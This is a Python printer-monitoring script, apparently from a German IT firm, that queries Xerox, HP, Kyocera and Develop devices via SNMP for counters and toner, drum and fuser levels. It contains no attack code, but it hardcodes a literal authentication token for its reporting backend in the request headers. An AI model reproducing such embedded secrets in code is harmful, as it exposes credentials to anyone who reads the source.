#!/usr/bin/env python3
# -*- coding: utf-8 -*-

r"""
Description:
	1) Connects to printers and reads its
		predefined values via SNMP.

	2) Reports values to URL.

Values:
	Name, S/N, Prints, Toner, ...

	[!] -1 means no value on OID; usually happens
		if a printer doesn't support the
		  requested function
	[!] -404 Timeout
	[!] -401 Unhandled Exception

"""

__author__ = 'Rau Systemberatung GmbH, 2024'
__copyright__ = '(c) Rau Systemberatung GmbH, 2024'
__version__ = '1.30'
__email__ = 'info@rausys.de'
__python__ = '3.x'
__service__ = 'PrinterMonitoring'


from pysnmp.entity.rfc3413.oneliner import cmdgen
from pysnmp.proto import rfc1905
from datetime import datetime, timezone
import argparse
import requests
import json

import os
from enum import Enum
import logging
import logging.handlers


BACKEND = 'https://sys.rau.biz/api/printer/'
HEADERS = {
    'Authentication': '1337Auth0rizedPrinterz#',
    'Content-Type': 'application/json; charset=utf-8',
    'User-Agent': f'RAUSYS Automation - Printers {__version__}',
}
PROXIES = {
    'http':'',
    'https':'',
}

os.chdir(os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__))))
LOG_LEVEL = logging.INFO  # logging.DEBUG // .ERROR...
LOG_FILE = 'RauSys-Monitoring.log'
LOG_PATH = os.path.join(os.getcwd(), LOG_FILE)
logging.basicConfig(
    format='%(asctime)s - [%(levelname)s] %(message)s',
    level=LOG_LEVEL,
    handlers=[
        logging.StreamHandler(),
        logging.handlers.RotatingFileHandler(
            LOG_PATH,
            maxBytes=5000000,   # 10 MB
            backupCount=3
        )
    ]
)

logger = logging.getLogger(__name__)


class PrinterConsumable():
    """ Hilfsklasse für Drucker Verbrauchsmaterialien """

    class Consumable(Enum):
        FUSER = 'FUSER'
        CLEANER = 'CLEANER'
        TRANSFER = 'TRANSFER'
        WASTE = 'WASTE'
        BLACK_TONER = 'BLACK_TONER'
        CYAN_TONER = 'CYAN_TONER'
        MAGENTA_TONER = 'MAGENTA_TONER'
        YELLOW_TONER = 'YELLOW_TONER'
        BLACK_DRUM = 'BLACK_DRUM'
        CYAN_DRUM = 'CYAN_DRUM'
        MAGENTA_DRUM = 'MAGENTA_DRUM'
        YELLOW_DRUM = 'YELLOW_DRUM'

    def __init__(self, name, capacity, remaining, type):
        logger.debug(f'|--> {type} {name}')
        self.name = name
        self.capacity = int(capacity) if capacity and capacity.isdigit() else None
        self.remaining = int(remaining) if isinstance(remaining, str) and remaining.isdigit() else None  # can be 0
        self.type = type.value
        if not self.initialized: logger.warning(f'{self} did not initialize properly!')

    def __str__(self) -> str:
        if not self.initialized: return f'[{self.type}] – no data –'
        return f'[{self.type}] {self.name} ({self.remaining}/{self.capacity}) {self.percentage}%'

    @property
    def percentage(self) -> int:
        if self.remaining is None or self.capacity is None: return None
        z = self.remaining / self.capacity
        if z > 1 or z < 0:
            z = self.capacity / self.remaining
        return int(round(z,2)*100)

    @property
    def initialized(self):
        """ Hilfsfunktion um zu evaluieren, ob Consumable vollständig
        initialisiert wurde oder nicht """
        return self.capacity


class Printer():
    oid_printer_name = '1.3.6.1.2.1.1.5.0'
    oid_printer_model = '1.3.6.1.2.1.25.3.2.1.3.1'
    oid_printer_meta = '1.3.6.1.2.1.1.1.0'
    # alternativ 1.3.6.1.4.1.2699.1.2.1.2.1.1.3.1
    # alternativ2 1.3.6.1.2.1.1.1.0
    oid_printer_serial = '1.3.6.1.2.1.43.5.1.1.17.1'
    # alternativ SN: 1.3.6.1.4.1.253.8.53.3.2.1.3.1

    # Usage/Prints Details
    oid_print_count = '1.3.6.1.4.1.253.8.53.13.2.1.6.1.20.1'
    oid_print_color = '1.3.6.1.4.1.253.8.53.13.2.1.6.1.20.33'
    oid_print_mono = '1.3.6.1.4.1.253.8.53.13.2.1.6.1.20.34'

    # Fixiereinheit/Fuser Kit
    oid_fuser_name = '1.3.6.1.2.1.43.11.1.1.6.1.9'
    oid_fuser_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.9'
    oid_fuser_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.9'

    # Resttonbehälter/Waste Cartridge
    oid_waste_name = '1.3.6.1.2.1.43.11.1.1.6.1.10'
    oid_waste_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.10'
    oid_waste_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.10'

    # Bandreiniger/Transfer Belt Cleaner Kit
    oid_cleaner_name = '1.3.6.1.2.1.43.11.1.1.6.1.11'
    oid_cleaner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.11'
    oid_cleaner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.11'

    # Transferrolle/Transfer Roller
    oid_transfer_name = '1.3.6.1.2.1.43.11.1.1.6.1.12'
    oid_transfer_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.12'
    oid_transfer_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.12'

    ## Toner ##########
    oid_black_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.1'
    oid_black_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.1'
    oid_black_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.1'

    oid_cyan_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.2'
    oid_cyan_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.2'
    oid_cyan_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.2'

    oid_magenta_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.3'
    oid_magenta_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.3'
    oid_magenta_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.3'

    oid_yellow_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.4'
    oid_yellow_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.4'
    oid_yellow_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.4'

    ## Bildtrommel ##########
    oid_black_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.5'
    oid_black_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.5'
    oid_black_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.5'

    oid_cyan_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.6'
    oid_cyan_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.6'
    oid_cyan_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.6'

    oid_magenta_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.7'
    oid_magenta_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.7'
    oid_magenta_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.7'

    oid_yellow_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.8'
    oid_yellow_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.8'
    oid_yellow_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.8'

    def __init__(self, ip, description, kunde, serial, *args, port=161, community='public', **kwargs):
        self.ip = ip
        self.kunde = kunde
        self.serial = serial
        self.description = description
        self.variant = type(self).__name__.lower()

        self.port = port
        self.community = community
        self.version = __version__
        self.status = 'ERROR'
        self.status = 'OK' if self.ping() else 'TIMEOUT'

    def to_json(self) -> dict:
        x = self.__dict__
        consumables = x.pop('consumables', list())
        x['consumables'] = list()
        for consumable in consumables:
            x['consumables'].append(consumable.__dict__)
        return x

    def initialize_values(self):
        logger.info(f'[>] Initialisiere Drucker {self.description} [{self.ip}]...')
        self.name = self.query_snmp(self.oid_printer_name)
        self.model = self.query_snmp(self.oid_printer_model)
        #self.serial = self.query_snmp(self.oid_printer_serial)
        self.meta = self.query_snmp(self.oid_printer_meta)

        self.print_count = self.query_snmp(self.oid_print_count)
        self.print_color = self.query_snmp(self.oid_print_color)
        self.print_mono = self.query_snmp(self.oid_print_mono)

        # Fallback um print_count vollständig zu initialisieren
        if not self.print_count:
            self.print_count = (self.print_color or 0) + (self.print_mono or 0)
            if not self.print_count: self.print_count = None

        self.consumables = []

        for consumable in PrinterConsumable.Consumable:
            # wenn oid_<consumable>_capacity gesetzt ist (also falls Variable vorhanden und
            # mit Wert belegt ist), initialisieren
            if getattr(self, f'oid_{consumable.value.lower()}_capacity'):
                logger.debug(f'Detected {consumable.value} as being present in OIDs')
                oid_name = getattr(self, f'oid_{consumable.value.lower()}_name')
                oid_capacity = getattr(self, f'oid_{consumable.value.lower()}_capacity')
                oid_remaining = getattr(self, f'oid_{consumable.value.lower()}_remaining')
                consumable_instance = PrinterConsumable(
                    name=self.query_snmp(oid_name),
                    capacity=self.query_snmp(oid_capacity),
                    remaining=self.query_snmp(oid_remaining),
                    type=consumable
                )

                if consumable_instance.initialized: self.consumables.append(consumable_instance)

    def ping(self) -> bool:
        if self.query_snmp(self.oid_printer_name):
            logger.info(f'[>] Drucker online, {self.description} [{self.ip}]')
            return True
        logger.error(f'Drucker nicht erreichbar oder "oid_printer_name" nicht auflösbar, {self.description} [{self.ip}]')
        return False

    def query_snmp(self, oid: str):
        """ SNMP Abfrage für angegebene OID """

        if self.status == 'TIMEOUT': return None
        if not oid: return None

        logger.debug(f'Querying {oid}...')
        cmdGen = cmdgen.CommandGenerator()
        error_indicator, error_status, error_index, binds = cmdGen.getCmd(
            #cmdgen.CommunityData(self.community, mpModel=0),
            cmdgen.CommunityData(self.community),
            cmdgen.UdpTransportTarget((self.ip, self.port)), oid)

        # Check for errors and print out results
        if error_indicator:
            logger.error(f'{error_indicator} for {self.ip}')
            return None

        elif error_status:
            logger.error(f'{error_status} at {error_index and binds[int(error_index)-1] or "?"}')
            return None

        for name, val in binds:
            logger.debug(f'{name} = {val}')
            # Evaluiert, ob kein Wert an OID; kein Wert an OID = -1
            if val is None or isinstance(val, rfc1905.NoSuchInstance) or isinstance(val, rfc1905.NoSuchObject):
                logger.debug(f'No OID such object!...')
                return None
            logger.debug(f'Returning OID value: {val}')
            return str(val).rstrip('\x00')

    def get_consumable(self, name: str) -> PrinterConsumable:
        """ Hilfsfunktion um Consumable zurückzugeben """
        for consumable in self.consumables:
            if consumable.type.lower() == name.lower():
                return consumable
        return '- nicht konfiguriert -'


class Xerox(Printer):
    """ Druckervariante normaler Xerox Drucker,
    der als Printer-Referenzobjekt dient. """
    pass


class XeroxC8130(Printer):
    """ Druckervariante Xerox Altalink C8130 (unserer) """
    # Resttonbehälter/Waste Cartridge
    oid_waste_name = '1.3.6.1.2.1.43.11.1.1.6.1.9'
    oid_waste_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.9'
    oid_waste_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.9'
    # Transferrolle/Transfer Roller
    oid_transfer_name = '1.3.6.1.2.1.43.11.1.1.6.1.11'
    oid_transfer_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.11'
    oid_transfer_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.11'
    # Bandreiniger/Transfer Belt Cleaner Kit
    oid_cleaner_name = '1.3.6.1.2.1.43.11.1.1.6.1.10'
    oid_cleaner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.10'
    oid_cleaner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.10'


class XeroxBW(Printer):

    def initialize_values(self):
        Printer.initialize_values(self)
        consumables = []
        # Append consumables in this list with a manually overwritten type
        manual_consumables = [
            PrinterConsumable.Consumable.FUSER
        ]
        remaining_status = lambda capacity, remaining: "1" if self.query_snmp(remaining) == "-3" and self.query_snmp(capacity) == "-2" else "0"

        for manual_consumable in manual_consumables:
            # check consumable has not been initialized automatically previously
            if manual_consumable.value in [consumable.type for consumable in self.consumables]:
                logger.warning(f'Manual Consumable {manual_consumable.value} initialization failed, because it was ' \
                    'already added during the automatic routine')
                continue

            # initialize based on manual OID overwrites
            capacity_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_capacity_manual')
            remaining_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_remaining_manual')
            name_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_name_manual')
            consumable = PrinterConsumable(
                type=manual_consumable,
                name=self.query_snmp(name_oid),
                capacity="1",
                remaining=remaining_status(capacity_oid, remaining_oid)
            )
            if consumable.initialized: self.consumables.append(consumable)

    oid_printer_name = '1.3.6.1.2.1.1.1.0'

    # Fixiereinheit/Fuser Kit
    oid_fuser_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.40'
    oid_fuser_capacity_manual =  '1.3.6.1.2.1.43.11.1.1.8.1.40'
    oid_fuser_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.40'

    oid_fuser_name = None
    oid_fuser_capacity = None
    oid_fuser_remaining = None
    
    """ Druckervariante Xerox Schwarzweiß """
    oid_black_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.6'
    oid_black_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.6'
    oid_black_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.6'

    # Resttonbehälter/Waste Cartridge
    oid_waste_name = None
    oid_waste_capacity = None
    oid_waste_remaining = None

    # Bandreiniger/Transfer Belt Cleaner Kit
    oid_cleaner_name = None
    oid_cleaner_capacity = None
    oid_cleaner_remaining = None

    # Transferrolle/Transfer Roller
    oid_transfer_name = None
    oid_transfer_capacity = None
    oid_transfer_remaining = None

    oid_cyan_toner_name = None
    oid_cyan_toner_capacity = None
    oid_cyan_toner_remaining = None

    oid_magenta_toner_name = None
    oid_magenta_toner_capacity = None
    oid_magenta_toner_remaining = None

    oid_yellow_toner_name = None
    oid_yellow_toner_capacity = None
    oid_yellow_toner_remaining = None

    ## Bildtrommel ##########
    oid_magenta_drum_name = None
    oid_magenta_drum_capacity = None
    oid_magenta_drum_remaining = None

    oid_cyan_drum_name = None
    oid_cyan_drum_capacity = None
    oid_cyan_drum_remaining = None

    oid_yellow_drum_name = None
    oid_yellow_drum_capacity = None
    oid_yellow_drum_remaining = None


class XeroxWC3225(Printer):
    """ Druckervariante Xerox WorkCentre 3225 """
    oid_black_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.2'
    oid_black_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.2'
    oid_black_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.2'
    oid_cyan_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.5'
    oid_cyan_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.5'
    oid_cyan_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.5'


class XeroxVLB405(XeroxBW):
    """ Druckervariante Xerox VersaLink B400 und B405 """
    def initialize_values(self):
        Printer.initialize_values(self)
        consumables = []
        # Append consumables in this list with a manually overwritten type
        manual_consumables = [
            PrinterConsumable.Consumable.CLEANER
        ]
        remaining_status = lambda capacity, remaining: "1" if self.query_snmp(remaining) == "-3" and self.query_snmp(capacity) == "-2" else "0"

        for manual_consumable in manual_consumables:
            # check consumable has not been initialized automatically previously
            if manual_consumable.value in [consumable.type for consumable in self.consumables]:
                logger.warning(f'Manual Consumable {manual_consumable.value} initialization failed, because it was ' \
                    'already added during the automatic routine')
                continue

            # initialize based on manual OID overwrites
            capacity_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_capacity_manual')
            remaining_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_remaining_manual')
            name_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_name_manual')
            consumable = PrinterConsumable(
                type=manual_consumable,
                name=self.query_snmp(name_oid),
                capacity="1",
                remaining=remaining_status(capacity_oid, remaining_oid)
            )
            if consumable.initialized: self.consumables.append(consumable)

    # Wartungs Kit
    oid_cleaner_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.40'
    oid_cleaner_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.40'
    oid_cleaner_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.40'


class XeroxVLC405(Printer):
    """ Druckervariante Xerox VersaLink C405 """
    def initialize_values(self):
        Printer.initialize_values(self)
        consumables = []
        # Append consumables in this list with a manually overwritten type
        manual_consumables = [
            PrinterConsumable.Consumable.FUSER,
            PrinterConsumable.Consumable.CLEANER,
            PrinterConsumable.Consumable.WASTE
        ]
        remaining_status = lambda capacity, remaining: "1" if self.query_snmp(remaining) == "-3" and self.query_snmp(capacity) == "-2" else "0"

        for manual_consumable in manual_consumables:
            # check consumable has not been initialized automatically previously
            if manual_consumable.value in [consumable.type for consumable in self.consumables]:
                logger.warning(f'Manual Consumable {manual_consumable.value} initialization failed, because it was ' \
                    'already added during the automatic routine')
                continue

            # initialize based on manual OID overwrites
            capacity_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_capacity_manual')
            remaining_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_remaining_manual')
            name_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_name_manual')
            consumable = PrinterConsumable(
                type=manual_consumable,
                name=self.query_snmp(name_oid),
                capacity="1",
                remaining=remaining_status(capacity_oid, remaining_oid)
            )
            if consumable.initialized: self.consumables.append(consumable)

    oid_cyan_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.4'
    oid_cyan_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.4'
    oid_cyan_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.4'
    oid_yellow_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.2'
    oid_yellow_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.2'
    oid_yellow_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.2'

    # Fixiereinheit/Fuser Kit

    oid_fuser_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.12'
    oid_fuser_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.12'
    oid_fuser_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.12'

    oid_fuser_name = None
    oid_fuser_capacity = None
    oid_fuser_remaining = None

    # Resttonbehälter/Waste Cartridge
    oid_waste_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.5'
    oid_waste_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.5'
    oid_waste_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.5'

    oid_waste_name = None
    oid_waste_capacity = None
    oid_waste_remaining = None

    # Bandreiniger/Transfer Belt Cleaner Kit
    oid_cleaner_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.39'
    oid_cleaner_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.39'
    oid_cleaner_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.39'

    oid_cleaner_name = None
    oid_cleaner_capacity = None
    oid_cleaner_remaining = None

    # Transferrolle/Transfer Roller
    oid_transfer_name = None
    oid_transfer_capacity = None
    oid_transfer_remaining = None

    ## Bildtrommel ##########
    oid_black_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.41'
    oid_black_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.41'
    oid_black_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.41'

    oid_cyan_drum_name = None
    oid_cyan_drum_capacity = None
    oid_cyan_drum_remaining = None

    oid_magenta_drum_name = None
    oid_magenta_drum_capacity = None
    oid_magenta_drum_remaining = None

    oid_yellow_drum_name = None
    oid_yellow_drum_capacity = None
    oid_yellow_drum_remaining = None


class XeroxVLC505S(XeroxVLC405):
    def initialize_values(self):
        Printer.initialize_values(self)
        consumables = []
        # Append consumables in this list with a manually overwritten type
        manual_consumables = [
            PrinterConsumable.Consumable.FUSER,
            PrinterConsumable.Consumable.CLEANER,
            PrinterConsumable.Consumable.WASTE,
            PrinterConsumable.Consumable.TRANSFER
        ]
        remaining_status = lambda capacity, remaining: "1" if self.query_snmp(remaining) == "-3" and self.query_snmp(capacity) == "-2" else "0"

        for manual_consumable in manual_consumables:
            # check consumable has not been initialized automatically previously
            if manual_consumable.value in [consumable.type for consumable in self.consumables]:
                logger.warning(f'Manual Consumable {manual_consumable.value} initialization failed, because it was ' \
                    'already added during the automatic routine')
                continue

            # initialize based on manual OID overwrites
            capacity_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_capacity_manual')
            remaining_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_remaining_manual')
            name_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_name_manual')
            consumable = PrinterConsumable(
                type=manual_consumable,
                name=self.query_snmp(name_oid),
                capacity="1",
                remaining=remaining_status(capacity_oid, remaining_oid)
            )
            if consumable.initialized: self.consumables.append(consumable)

    # Einzugsrolle Behälter 1
    oid_transfer_name = None
    oid_transfer_capacity = None
    oid_transfer_remaining = None

    oid_transfer_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.18'
    oid_transfer_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.18'
    oid_transfer_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.18'


    # Toner (swap cyan with yellow)
    oid_cyan_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.4'
    oid_cyan_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.4'
    oid_cyan_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.4'

    oid_yellow_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.2'
    oid_yellow_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.2'
    oid_yellow_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.2'

    # Fixiereinheit/Fuser Kit

    oid_fuser_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.12'
    oid_fuser_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.12'
    oid_fuser_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.12'

    oid_fuser_name = None
    oid_fuser_capacity = None
    oid_fuser_remaining = None

    # Sammelbehälter (Waste?)
    oid_waste_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.5'
    oid_waste_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.5'
    oid_waste_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.5'

    oid_waste_name = None
    oid_waste_capacity = None
    oid_waste_remaining = None

    # Wartungskit
    oid_cleaner_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.39'
    oid_cleaner_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.39'
    oid_cleaner_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.39'

    oid_cleaner_name = None
    oid_cleaner_capacity = None
    oid_cleaner_remaining = None

    ## Bildtrommel ##########
    oid_black_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.6'
    oid_black_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.6'
    oid_black_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.6'

    oid_yellow_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.7'
    oid_yellow_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.7'
    oid_yellow_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.7'

    oid_magenta_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.8'
    oid_magenta_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.8'
    oid_magenta_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.8'

    oid_cyan_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.9'
    oid_cyan_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.9'
    oid_cyan_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.9'


class HP(Printer):
    """ Druckervariante regulärer HP LaserJet Color. """
    oid_printer_name = '1.3.6.1.2.1.43.5.1.1.16.1'

    # Usage/Prints Details
    oid_print_count = '1.3.6.1.4.1.11.2.3.9.4.2.1.1.16.1.9.0'
    oid_print_color = '1.3.6.1.4.1.11.2.3.9.4.2.1.1.16.1.10.0'
    oid_print_mono = '1.3.6.1.4.1.11.2.3.9.4.2.1.1.16.1.11.0'


class HPBW(Printer):

    # Usage/Prints Details
    oid_print_count = '1.3.6.1.4.1.11.2.3.9.4.2.1.1.16.1.9.0'

    # Fixiereinheit/Fuser Kit
    oid_fuser_name = '1.3.6.1.2.1.43.11.1.1.6.1.2'
    oid_fuser_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.2'
    oid_fuser_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.2'

    ## damit der Rest -1 zurückgibt...
    oid_print_color = None
    oid_cyan_toner_name = None
    oid_cyan_toner_capacity = None
    oid_cyan_toner_remaining = None

    oid_magenta_toner_name = None
    oid_magenta_toner_capacity = None
    oid_magenta_toner_remaining = None

    oid_yellow_toner_name = None
    oid_yellow_toner_capacity = None
    oid_yellow_toner_remaining = None

    ## Bildtrommel ##########
    oid_black_drum_name = None
    oid_black_drum_capacity = None
    oid_black_drum_remaining = None

    oid_cyan_drum_name = None
    oid_cyan_drum_capacity = None
    oid_cyan_drum_remaining = None

    oid_magenta_drum_name = None
    oid_magenta_drum_capacity = None
    oid_magenta_drum_remaining = None

    oid_yellow_drum_name = None
    oid_yellow_drum_capacity = None
    oid_yellow_drum_remaining = None


class HPMFP(HP):
    oid_print_count = '1.3.6.1.2.1.43.10.2.1.4.1.1'
    oid_print_mono = '1.3.6.1.2.1.43.10.2.1.4.1.1'


class HPM426(HP):
    """ HP LJ MFP M426 """
    oid_print_count = '1.3.6.1.2.1.43.10.2.1.4.1.1'
    oid_print_color = None
    oid_print_mono = '1.3.6.1.2.1.43.10.2.1.4.1.1'

    # Fixiereinheit/Fuser Kit
    oid_fuser_name = None
    oid_fuser_capacity = None
    oid_fuser_remaining = None

    # Resttonbehälter/Waste Cartridge
    oid_waste_name = None
    oid_waste_capacity = None
    oid_waste_remaining = None

    # Bandreiniger/Transfer Belt Cleaner Kit
    oid_cleaner_name = None
    oid_cleaner_capacity = None
    oid_cleaner_remaining = None

    # Transferrolle/Transfer Roller
    oid_transfer_name = None
    oid_transfer_capacity = None
    oid_transfer_remaining = None

    ## Toner ##########
    oid_black_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.1'
    oid_black_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.1'
    oid_black_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.1'

    oid_cyan_toner_name = None
    oid_cyan_toner_capacity = None
    oid_cyan_toner_remaining = None

    oid_magenta_toner_name = None
    oid_magenta_toner_capacity = None
    oid_magenta_toner_remaining = None

    oid_yellow_toner_name = None
    oid_yellow_toner_capacity = None
    oid_yellow_toner_remaining = None

    ## Bildtrommel ##########
    oid_black_drum_name = None
    oid_black_drum_capacity = None
    oid_black_drum_remaining = None

    oid_cyan_drum_name = None
    oid_cyan_drum_capacity = None
    oid_cyan_drum_remaining = None

    oid_magenta_drum_name = None
    oid_magenta_drum_capacity = None
    oid_magenta_drum_remaining = None

    oid_yellow_drum_name = None
    oid_yellow_drum_capacity = None
    oid_yellow_drum_remaining = None


class KCSW(Printer):
    # Kyocera spezifisch Overall Prints
    oid_print_count = '1.3.6.1.4.1.1347.42.2.1.1.1.6.1.1'
    oid_print_mono = '1.3.6.1.4.1.1347.42.2.1.1.1.6.1.1'

    ## damit der Rest -1 zurückgibt...
    oid_print_color = '1.3.6.1'
    oid_cyan_toner_name = '1.3.6.1'
    oid_cyan_toner_capacity = '1.3.6.1'
    oid_cyan_toner_remaining = '1.3.6.1'

    oid_magenta_toner_name = '1.3.6.1'
    oid_magenta_toner_capacity = '1.3.6.1'
    oid_magenta_toner_remaining = '1.3.6.1'

    oid_yellow_toner_name = '1.3.6.1'
    oid_yellow_toner_capacity = '1.3.6.1'
    oid_yellow_toner_remaining = '1.3.6.1'

    ## Bildtrommel ##########
    oid_black_drum_name = '1.3.6.1'
    oid_black_drum_capacity = '1.3.6.1'
    oid_black_drum_remaining = '1.3.6.1'

    oid_cyan_drum_name = '1.3.6.1'
    oid_cyan_drum_capacity = '1.3.6.1'
    oid_cyan_drum_remaining = '1.3.6.1'

    oid_magenta_drum_name = '1.3.6.1'
    oid_magenta_drum_capacity = '1.3.6.1'
    oid_magenta_drum_remaining = '1.3.6.1'

    oid_yellow_drum_name = '1.3.6.1'
    oid_yellow_drum_capacity = '1.3.6.1'
    oid_yellow_drum_remaining = '1.3.6.1'

    # Bandreiniger auf -1
    oid_cleaner_name = '1.3.6.1'
    oid_cleaner_capacity = '1.3.6.1'
    oid_cleaner_remaining = '1.3.6.1'


class DICL(Printer):
    # Develop Ineo 450 / äquivalente Kyocera Produkte

    def initialize_values(self):
        Printer.initialize_values(self)
        consumables = []
        # Append consumables in this list with a manually overwritten type
        manual_consumables = [
            PrinterConsumable.Consumable.WASTE
        ]
        remaining_status = lambda capacity, remaining: "1" if self.query_snmp(remaining) == "-3" and self.query_snmp(capacity) == "-2" else "0"

        for manual_consumable in manual_consumables:
            # check consumable has not been initialized automatically previously
            if manual_consumable.value in [consumable.type for consumable in self.consumables]:
                logger.warning(f'Manual Consumable {manual_consumable.value} initialization failed, because it was ' \
                    'already added during the automatic routine')
                continue

            # initialize based on manual OID overwrites
            capacity_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_capacity_manual')
            remaining_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_remaining_manual')
            name_oid = getattr(self, f'oid_{manual_consumable.value.lower()}_name_manual')
            consumable = PrinterConsumable(
                type=manual_consumable,
                name=self.query_snmp(name_oid),
                capacity="1",
                remaining=remaining_status(capacity_oid, remaining_oid)
            )
            if consumable.initialized: self.consumables.append(consumable)
        
        if self.print_color is None: return  # if not initialized casting None to int below will raise an error
        self.print_color = int(self.print_color) + int(self.query_snmp(self.oid_copies_color))
        self.print_mono = int(self.print_mono) + int(self.query_snmp(self.oid_copies_monochrome))

